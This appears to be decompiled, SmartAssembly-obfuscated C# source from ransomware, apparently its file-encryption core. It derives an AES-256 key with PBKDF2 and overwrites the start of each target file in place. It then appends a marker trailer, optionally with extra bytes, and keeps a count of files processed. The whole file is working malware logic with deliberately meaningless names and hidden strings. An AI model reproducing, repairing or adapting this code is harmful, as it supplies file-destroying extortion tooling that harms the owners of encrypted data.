using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

public static class ufQnCLzUSY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] LLqeTUvZTvS(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = XEdapWMTxRoWazs(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes XEdapWMTxRoWazs(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] QCdhmxBPZB(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (NiISdmMYRfnXGiX.OFRFzhlcWBOLOw == getString_0(107397002))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (NiISdmMYRfnXGiX.SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(NiISdmMYRfnXGiX.eBcYzZJOdxm, getString_0(107389271) + string_0 + getString_0(107403007) + ex.Message + getString_0(107396795));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void FavttmDwCR(string zglVXSzColkNb, byte[] YILmajIKZPh, byte[] FsywuXEZiQBBeb = null)
	{
		try
		{
			byte[] array = null;
			if (NiISdmMYRfnXGiX.OFRFzhlcWBOLOw == getString_0(107397002))
			{
				array = (NiISdmMYRfnXGiX.dHWQzBpmcn ? Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461))) : Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(zglVXSzColkNb, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(YILmajIKZPh, 0, YILmajIKZPh.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(zglVXSzColkNb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NiISdmMYRfnXGiX.dHWQzBpmcn)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(FsywuXEZiQBBeb, 0, FsywuXEZiQBBeb.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (NiISdmMYRfnXGiX.dHWQzBpmcn ? Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461))) : Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438))));
				FileStream fileStream2 = new FileStream(zglVXSzColkNb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(YILmajIKZPh, 0, YILmajIKZPh.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(zglVXSzColkNb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NiISdmMYRfnXGiX.dHWQzBpmcn)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(FsywuXEZiQBBeb, 0, FsywuXEZiQBBeb.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			NiISdmMYRfnXGiX.RVAcslUCYF++;
		}
		catch (Exception ex)
		{
			if (NiISdmMYRfnXGiX.SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(NiISdmMYRfnXGiX.eBcYzZJOdxm, getString_0(107389271) + zglVXSzColkNb + getString_0(107403452) + ex.Message + getString_0(107396795));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (NiISdmMYRfnXGiX.dHWQzBpmcn ? Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403461))) : Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(NiISdmMYRfnXGiX.hLKVRldzJzt) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438)) + Convert.ToString(NiISdmMYRfnXGiX.CiXuUORQDucyebW) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403438))));
			FileStream fileStream4 = new FileStream(zglVXSzColkNb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(YILmajIKZPh, 0, YILmajIKZPh.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(zglVXSzColkNb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!NiISdmMYRfnXGiX.dHWQzBpmcn)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(FsywuXEZiQBBeb, 0, FsywuXEZiQBBeb.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static ufQnCLzUSY()
	{
		Strings.CreateGetStringDelegate(typeof(ufQnCLzUSY));
	}
}
